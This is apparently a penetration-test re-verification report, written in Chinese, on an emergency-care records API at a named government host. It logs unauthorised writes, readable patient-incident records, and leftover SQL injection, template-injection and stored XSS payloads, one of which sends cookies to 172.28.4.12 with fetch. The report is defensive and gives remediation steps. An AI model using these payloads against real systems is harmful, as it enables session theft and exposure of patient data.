# EPCR :4008 /MciTypes 複驗報告 — 2026-09-14

- 目標：`https://epcr.tpf.gov.tw:4008`（單一 URL 邊界，未擴 scope）
- 驗證時間：2026-09-14 13:45~13:47 CST（UTC+8）
- 方法：curl -k，僅 GET + 預期失敗的 POST/PATCH/PUT/DELETE，不做 webshell / 刪除 / DoS
- 前案對照：`683bdb97`（CSRF）、`47785161`（集合層寫入鏈）

## 結論（7 項）

- [確認] POST /MciTypes 未授權寫入：本次新建 `id=1014044`，201 Created
- [確認] Stored XSS 持久化：集合 GET 原字串回顯 `id=1000021`、`1013`、`1000027`
- [確認] SSTI 字串寫入：`id=1000022`、`1024`、`1000028（{{7*7}}）` 仍在庫
- [確認] SQLi 字串寫入：`id=1000020（' OR pg_sleep(5)--）`、`1000/1005/1025` 仍在庫
- [確認] PHI 未授權讀取：GET /MciCaseRecords 200，`Content-Range: items 0-99/5535`
- [確認] 資源級鎖存在但不對稱：PUT/PATCH/DELETE /MciTypes/1003 均 401；單筆 GET /MciTypes/1000021 亦 401，但集合 GET /MciTypes 200
- [確認] Mass assignment 受阻：POST 帶 `id:1` 回 400 `PRIMARY must be unique`；巢狀 `{"name":{"$ne":"x"}}` 回 400 `string violation`；未知欄位靜默忽略
- [部分差異] ORM 操作符：本次 `filter[where][name][$ne]` 回 200 全量（被忽略），非報告所述 500；結論不變：無 NoSQL 注入，僅靜默忽略

## 實測證據（Burp 式原文）

### 1. 未授權寫入（本次新建，需清理）

請求：
```
POST /MciTypes HTTP/1.1
Host: epcr.tpf.gov.tw:4008
Origin: https://attacker.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

name=CYBERSEC_PENTEST_VERIFY_1789364745
```

響應：
```
HTTP/1.1 201 Created
location: /MciTypes/1014044
content-type: application/json; charset=utf-8

{"id":1014044,"name":"CYBERSEC_PENTEST_VERIFY_1789364745","updatedAt":"2026-09-14T05:45:46.000Z","createdAt":"2026-09-14T05:45:46.000Z"}
```

### 2. 集合讀取 + 殘留確認

```
GET /MciTypes → 200，Content-Range: items 0-99/4161，17875B（首頁 100 筆）
```

- 首頁即含：1000 `test' OR 1=1--`、1012 `http://172.28.4.12:8080/`、1013 `<script>alert(document.cookie)</script>`、1024 `{{constructor.constructor("alert(1)")()}}`、1000020 SQLi、1000021 Stored XSS、1000022 SSTI、1000038 CSRF 殘留、1000103~1000154 sqlmap 殘留數十筆
- 總量已由報告時 42 筆膨脹至 4161 筆

### 3. Stored XSS 原字串回顯（GET 集合內）

```
"id":1000021,"name":"<script>fetch('http://172.28.4.12:8080/?c='+document.cookie)</script>"
```

- 無 HTML 轉義；前端若 v-html 渲染即執行

### 4. PHI 讀取（僅取 header + 計數，未落盤敏感內容）

```
GET /MciCaseRecords → 200，Content-Range: items 0-99/5535，37600B
keys: id, name, address, numberOfAmbulance, isSimulation, createdAt, updatedAt, deletedAt, MciTypeId, StatusId, MciType, Status
```

### 5. 寫入邊界

```
PUT /MciTypes/1003 → 401 No authorization token was found
DELETE /MciTypes/1003 → 401
PATCH /MciTypes/1003 → 401
POST {"name":{"$ne":"x"}} → 400 {"message":"string violation: name cannot be an array or an object"}
POST {"name":"ADMIN_TYPE_FORCE_OVERRIDE","isValid":true,"id":1} → 400 {"message":"Validation error","errors":[{"field":"PRIMARY","message":"PRIMARY must be unique"}]}
HEAD / → 302 Location: /client/
OPTIONS /MciTypes → 204 Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
```

## 影響

- 任意人可寫字典 → 污染 + Stored XSS 植入 + 審計干擾
- 5535 筆 MCI 事件未授權可讀（含姓名/地址/救護車數/模擬旗標）
- 字典 4161 筆含大量歷史攻擊殘留，可用性與取證可信度已受損
- 單筆讀需授權、集合讀免授權：邊界倒置，前端一調集合即洩漏 + 觸發 XSS

## 修復建議

- POST /MciTypes 加 JWT 鑑權，與 PUT/PATCH/DELETE 一致；集合 GET 至少脫敏或加權
- /MciCaseRecords 加授權 + 最小欄位，禁止全量匿名拉取
- name 欄位輸出轉義 + 長度/字元白名單；Content-Security-Policy 擋 inline script
- CORS Origin 白名單 + SameSite=Strict；寫操作加 CSRF token
- 清理字典攻擊殘留（含本次 `1014044`），加寫入頻率限制 + 容量上限 + 審計告警

## 待辦

- [ ] 業務方確認並清理 4161 筆字典（含本次 `CYBERSEC_PENTEST_VERIFY_1789364745 / id=1014044`）
- [ ] 確認前端是否有 v-html 渲染 name（決定 Stored XSS 是否可觸發）
- [ ] /reset 後重測（依流程換目標前執行）
